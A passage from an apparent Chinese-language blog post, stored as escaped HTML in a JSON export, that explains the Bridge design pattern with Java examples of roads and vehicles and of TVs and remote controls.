class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">//基类 路</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"路\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//市区街道</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Street</span> <span class=\"keyword\">extends</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"市区街道\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//高速公路</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"高速公路\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//小汽车在市区街道行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CarOnStreet</span> <span class=\"keyword\">extends</span> <span class=\"title\">Street</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"小汽车在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//小汽车在高速公路行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CarOnSpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">SpeedWay</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"小汽车在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//公交车在市区街道行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BusOnStreet</span> <span class=\"keyword\">extends</span> <span class=\"title\">Street</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"公交车在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//公交车在高速公路行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BusOnSpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">SpeedWay</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"公交车在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//测试</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//小汽车在高速公路行驶</span></span><br><span class=\"line\">    CarOnSpeedWay carOnSpeedWay = <span class=\"keyword\">new</span> CarOnSpeedWay();</span><br><span class=\"line\">    carOnSpeedWay.run();</span><br><span class=\"line\">    <span class=\"comment\">//公交车在市区街道行驶</span></span><br><span class=\"line\">    BusOnStreet busOnStreet = <span class=\"keyword\">new</span> BusOnStreet();</span><br><span class=\"line\">    busOnStreet.run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但是我们说这样的设计是脆弱的，仔细分析就可以发现，它还是存在很多问题，首先它在遵循开放-封闭原则的同时，违背了类的单一职责原则，即一个类只有一个引起它变化的原因，而这里引起变化的原因却有两个，即路类型的变化和汽车类型的变化；其次是重复代码会很多，不同的汽车在不同的路上行驶也会有一部分的代码是相同的；</p>\n<p>再次是类的结构过于复杂，继承关系太多，难于维护，最后最致命的一点是扩展性太差。如果变化沿着汽车的类型和不同的道路两个方向变化，我们会看到这个类的结构会迅速的变庞大。</p>\n<h3 id=\"应用桥接模式来实现\"><a href=\"#应用桥接模式来实现\" class=\"headerlink\" title=\"应用桥接模式来实现\"></a>应用桥接模式来实现</h3><p>重新设计<br><img src=\"http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7mry2yj20gg0h1jsz.jpg\" alt=\"\"></p>\n<p>代码实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    AbstractCar aCar;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Street</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        aCar.run();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        aCar.run();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Car</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        System.out.print(<span class=\"string\">\"小汽车\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bus</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        System.out.print(<span class=\"string\">\"公交车\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    AbstractRoad speedWay = <span class=\"keyword\">new</span> SpeedWay();</span><br><span class=\"line\">    speedWay.aCar = <span class=\"keyword\">new</span> Car();</span><br><span class=\"line\">    speedWay.run();</span><br><span class=\"line\"></span><br><span class=\"line\">    AbstractRoad street = <span class=\"keyword\">new</span> Street();</span><br><span class=\"line\">    street.aCar = <span class=\"keyword\">new</span> Bus();</span><br><span class=\"line\">    street.run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里将Road 和 Car单独抽象，那么其中Road变化和Car变化，都不会影响相互的代码，也没有出现代码重复。通过对象组合的方式，Bridge 模式把两个角色之间的继承关系改为了耦合的关系，从而使这两者可以从容自若的各自独立的变化，这也是Bridge模式的本意。</p>\n<p>这样增加了客户程序与路与汽车的耦合。其实这样的担心是没有必要的，因为这种耦合性是由于对象的创建所带来的，完全可以用创建型模式去解决。在应用时结合创建型设计模式来处理具体的问题。</p>\n<h2 id=\"例子三\"><a href=\"#例子三\" class=\"headerlink\" title=\"例子三\"></a>例子三</h2><p>你有一个电视机的接口，还有一个遥控器的抽象类。我们都知道，将它们中任何一个定义为一个具体类都不是好办法，因为其它厂家会有不同的实现方法。</p>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><p>首先定义电视机的接口：ITV<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>实现三星的 ITV 接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SamsungTV</span> <span class=\"keyword\">implements</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung is turned on.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung is turned off.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung: channel - \"</span> + channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再实现索尼的ITV接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SonyTV</span> <span class=\"keyword\">implements</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony is turned on.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony is turned off.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony: channel - \"</span> + channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>遥控器要包含对TV的引用<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractRemoteControl</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> ITV tv;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">AbstractRemoteControl</span><span class=\"params\">(ITV tv)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.tv = tv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">turnOn</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        tv.on();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">turnOff</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        tv.off();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>&#123;</span><br><span class=\"line\">        tv.switchChannel(channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>定义遥控器的具体类<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LogitechRemoteControl</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRemoteControl</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">LogitechRemoteControl</span><span class=\"params\">(ITV tv)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(tv);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setChannelKeyboard</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>&#123;</span><br><span class=\"line\">        setChannel(channel);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Logitech use keyword to set channel.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        ITV tv = <span class=\"keyword\">new</span> SonyTV();</span><br><span class=\"line\">        LogitechRemoteControl lrc = <span class=\"keyword\">new</span> LogitechRemoteControl(tv);</span><br><span class=\"line\">        lrc.setChannelKeyboard(<span class=\"number\">100</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://cnbin.github.io/blog/2015/12/11/javashe-ji-mo-shi-chu-tan-zhi-qiao-jie-mo-shi/\" target=\"_blank\" rel=\"external\">Java设计模式-桥接模式</a></li>\n<li><a href=\"http://www.runoob.com/design-pattern/bridge-pattern.html\" target=\"_blank\" rel=\"external\">桥接模式</a></li>\n<li><a href=\"http://www.importnew.com/6857.html\" target=\"_blank\" rel=\"external\">讲故事，学（Java）设计模式—桥接模式</a></li>\n</ul>\n","excerpt":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><strong>桥接模式(Bridge)</strong>是用于把抽象化和实现化解耦，使得两者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化的桥接结构来实现两者的解耦。</p>\n<p><strong>桥接意图</strong> : 将抽象部分与实现部分分离，使它们都可以独立的变化<br><strong>主要解决</strong> : 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活<br><strong>何时使用</strong> : 实现系统可能有多个角度分类，每一种角度都可能变化<br><strong>如何解决</strong> : 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合<br><strong>主要代码</strong> : 抽象类依赖实现类<br><strong>桥接优点</strong> : 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明<br><strong>桥接缺点</strong> : 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程</p>\n<h2 id=\"例子一\"><a href=\"#例子一\" class=\"headerlink\" title=\"例子一\"></a>例子一</h2><p>我们需要画出一个红色的圆、绿色的圆、红色的正方形、绿色的正方形。在这个例子中，有两个变化的方面，一个是形状、一个是颜色。</p>\n<p>普通的设计是这样的 : 有一个圆类和一个正方形类实现Shape类，而圆类下面有两个子类，红色圆和绿色圆；正方形类下面有两个子类，红色正方形、绿色正方形。但是这样的设计会出现的问题是，当我需要添加一个其他变化的颜色时，诸如蓝色，那么情况会非常糟糕。我们需要在每个形状的下面重新添加一个蓝色形状的实现。这就是桥接定义的变化。</p>","more":"<p>为了解决这个问题，我们需要做的事情是将这两个变化放在抽象层，<br><img src=\"/images/bridge.png\" alt=\"\"></p>\n<blockquote>\n<p>补充一下，图片有点问题，其中Shape和Color都是抽象的，桥接的抽象独立变化，就是指的Shape和Color可以独立表化而不影响彼此。</p>\n</blockquote>\n<h2 id=\"例子二\"><a href=\"#例子二\" class=\"headerlink\" title=\"例子二\"></a>例子二</h2><p>拿汽车在路上行驶的来说。既有小汽车又有公共汽车，它们都不但能在市区中的公路上行驶，也能在高速公路上行驶。这你会发现，对于交通工具（汽车）有不同的类型，它们所行驶的环境（路）也有不同类型，在软件系统中就要适应两个方面（不同车型，不同道路）的变化，怎样实现才能应对这种变化呢？</p>\n<h3 id=\"比较传统的做法\"><a href=\"#比较传统的做法\" class=\"headerlink\" title=\"比较传统的做法\"></a>比较传统的做法</h3><p><img src=\"http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7m88sdj20jc0biq4l.jpg\" alt=\"\"></p>\n<p>代码实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">//基类 路</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"路\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//市区街道</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Street</span> <span class=\"keyword\">extends</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"市区街道\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//高速公路</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">Road</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        